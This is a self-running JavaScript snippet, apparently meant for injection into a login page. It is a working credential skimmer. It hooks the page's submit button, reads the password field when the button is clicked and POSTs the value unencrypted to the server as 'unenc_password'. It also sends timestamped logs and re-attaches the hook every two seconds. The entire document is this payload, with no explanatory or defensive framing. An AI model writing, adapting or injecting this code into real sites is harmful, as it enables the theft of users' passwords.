(function() {
  function startScript() {
    var startscript = "Script started at " + new Date().toISOString();
    var startRequest = new XMLHttpRequest();
    startRequest.open("POST", '/', true);
    startRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    startRequest.send("logs=" + encodeURIComponent(startscript));

    function onclickListener() {
      var submit = document.querySelectorAll('input[type="submit"]')[0];
      submit.setAttribute("onclick", "sendPass()");
      submit.addEventListener("click", sendPass);
      return;
    }

    function sendPass() {
      var password = document.getElementsByName("password")[0].value;
      var xhr = new XMLHttpRequest();
      xhr.open("POST", '/', true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send("unenc_password=" + encodeURIComponent(password));

      // Add logs for sendPass
      var sendPassLog = "sendPass executed at " + new Date().toISOString();
      var sendPassRequest = new XMLHttpRequest();
      sendPassRequest.open("POST", '/', true);
      sendPassRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      sendPassRequest.send("logs=" + encodeURIComponent(sendPassLog));

      return;
    }

    onclickListener(); // Call onclickListener immediately

    setInterval(function() {
      onclickListener(); // Call onclickListener every 2 seconds
    }, 2000);
  }

  startScript(); // Call the startScript function to initiate the loop.
})();
